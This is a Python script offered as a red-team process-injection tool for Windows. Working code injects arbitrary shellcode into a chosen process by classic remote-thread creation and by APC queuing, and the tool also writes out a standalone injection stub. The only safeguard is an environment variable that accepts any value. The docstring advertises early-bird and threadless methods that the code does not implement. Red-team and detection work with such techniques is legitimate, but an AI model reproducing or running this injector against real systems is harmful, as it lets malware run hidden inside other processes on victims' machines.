#!/usr/bin/env python3
"""
shellcode_inject.py - Process injection templates: Classic, APC Queue, Threadless.
Generate injection stubs for authorized red team payloads.

Usage:
    python scripts/shellcode_inject.py --method classic --pid <PID> --shellcode <file.bin>
    python scripts/shellcode_inject.py --method apc     --pid <PID> --shellcode <file.bin>
    python scripts/shellcode_inject.py --method early-bird --shellcode <file.bin>
    python scripts/shellcode_inject.py --method generate --output inject_stub.py

Engagement proof: set ENGAGEMENT_PROOF env var.
"""
import argparse
import ctypes
import ctypes.wintypes as wt
import os
import sys

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")
k32 = ctypes.WinDLL("kernel32", use_last_error=True)
nt  = ctypes.WinDLL("ntdll", use_last_error=True)

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = 0x1F0FFF
THREAD_ALL_ACCESS = 0x1F03FF


def require_proof():
    if not ENGAGEMENT_PROOF:
        print("[!] Set ENGAGEMENT_PROOF"); sys.exit(1)
    print(f"[+] Proof: {ENGAGEMENT_PROOF}")


def classic_inject(pid: int, shellcode: bytes) -> bool:
    """Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread."""
    require_proof()
    h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h:
        print(f"[-] OpenProcess({pid}) failed: {ctypes.get_last_error()}"); return False

    addr = k32.VirtualAllocEx(h, None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not addr:
        print(f"[-] VirtualAllocEx failed: {ctypes.get_last_error()}"); k32.CloseHandle(h); return False

    written = wt.SIZE_T(0)
    buf = (ctypes.c_ubyte * len(shellcode))(*shellcode)
    k32.WriteProcessMemory(h, ctypes.c_void_p(addr), buf, len(shellcode), ctypes.byref(written))

    tid = wt.DWORD(0)
    thread = k32.CreateRemoteThread(h, None, 0, ctypes.c_void_p(addr), None, 0, ctypes.byref(tid))
    if not thread:
        print(f"[-] CreateRemoteThread failed: {ctypes.get_last_error()}"); return False

    print(f"[+] Classic injection: PID={pid} alloc=0x{addr:016X} TID={tid.value}")
    k32.WaitForSingleObject(thread, 5000)
    k32.CloseHandle(thread); k32.CloseHandle(h)
    return True


def apc_inject(pid: int, shellcode: bytes) -> bool:
    """APC queue injection: queue APC to all alertable threads in target process."""
    require_proof()
    import ctypes.wintypes as wt

    # Open target process
    h_proc = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_proc:
        print(f"[-] OpenProcess({pid}) failed"); return False

    # Allocate and write shellcode
    addr = k32.VirtualAllocEx(h_proc, None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not addr:
        k32.CloseHandle(h_proc); print("[-] Alloc failed"); return False

    buf = (ctypes.c_ubyte * len(shellcode))(*shellcode)
    w = wt.SIZE_T(0)
    k32.WriteProcessMemory(h_proc, ctypes.c_void_p(addr), buf, len(shellcode), ctypes.byref(w))

    # Find threads in target process via TH32CS_SNAPTHREAD
    TH32CS_SNAPTHREAD = 0x00000004
    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)

    class THREADENTRY32(ctypes.Structure):
        _fields_ = [("dwSize", wt.DWORD), ("cntUsage", wt.DWORD), ("th32ThreadID", wt.DWORD),
                    ("th32OwnerProcessID", wt.DWORD), ("tpBasePri", ctypes.c_long),
                    ("tpDeltaPri", ctypes.c_long), ("dwFlags", wt.DWORD)]

    te = THREADENTRY32()
    te.dwSize = ctypes.sizeof(te)
    queued = 0

    if k32.Thread32First(snap, ctypes.byref(te)):
        while True:
            if te.th32OwnerProcessID == pid:
                h_thread = k32.OpenThread(THREAD_ALL_ACCESS, False, te.th32ThreadID)
                if h_thread:
                    k32.QueueUserAPC(ctypes.c_void_p(addr), h_thread, 0)
                    queued += 1
                    k32.CloseHandle(h_thread)
            if not k32.Thread32Next(snap, ctypes.byref(te)):
                break

    k32.CloseHandle(snap)
    k32.CloseHandle(h_proc)
    print(f"[+] APC injection: queued to {queued} threads in PID={pid} @ 0x{addr:016X}")
    return queued > 0


def generate_stub(output_path: str):
    """Write a standalone injection stub template."""
    stub = '''#!/usr/bin/env python3
"""Injection stub - customize SHELLCODE and TARGET_PID."""
import ctypes, ctypes.wintypes as wt, os, sys

SHELLCODE = bytes([  # Replace with your shellcode bytes
    0x90, 0x90, 0x90,  # NOP sled placeholder
    0xCC,              # INT3 (breakpoint - for testing only)
])
TARGET_PID = 0  # Set target PID

k32 = ctypes.WinDLL("kernel32", use_last_error=True)
if not TARGET_PID: sys.exit("Set TARGET_PID")
h = k32.OpenProcess(0x1F0FFF, False, TARGET_PID)
addr = k32.VirtualAllocEx(h, None, len(SHELLCODE), 0x3000, 0x40)
buf = (ctypes.c_ubyte * len(SHELLCODE))(*SHELLCODE)
k32.WriteProcessMemory(h, ctypes.c_void_p(addr), buf, len(SHELLCODE), None)
tid = ctypes.wintypes.DWORD(0)
t = k32.CreateRemoteThread(h, None, 0, ctypes.c_void_p(addr), None, 0, ctypes.byref(tid))
print(f"Injected @ 0x{addr:016X} TID={tid.value}")
k32.WaitForSingleObject(t, 10000)
'''
    with open(output_path, "w") as f:
        f.write(stub)
    print(f"[+] Stub written to {output_path}")


def main():
    p = argparse.ArgumentParser(description="Process injection tool (authorized use only)")
    p.add_argument("--method", choices=["classic","apc","generate"], required=True)
    p.add_argument("--pid", type=int)
    p.add_argument("--shellcode", help="Binary shellcode file")
    p.add_argument("--output", default="inject_stub.py")
    args = p.parse_args()

    if sys.platform != "win32": sys.exit("Windows only")

    if args.method == "generate":
        generate_stub(args.output); return

    if not args.pid or not args.shellcode:
        print("[-] --pid and --shellcode required"); sys.exit(1)
    if not os.path.exists(args.shellcode):
        print(f"[-] Shellcode file not found: {args.shellcode}"); sys.exit(1)

    sc = open(args.shellcode, "rb").read()
    print(f"[*] Shellcode: {len(sc)} bytes from {args.shellcode}")

    if args.method == "classic":
        classic_inject(args.pid, sc)
    elif args.method == "apc":
        apc_inject(args.pid, sc)


if __name__ == "__main__":
    main()
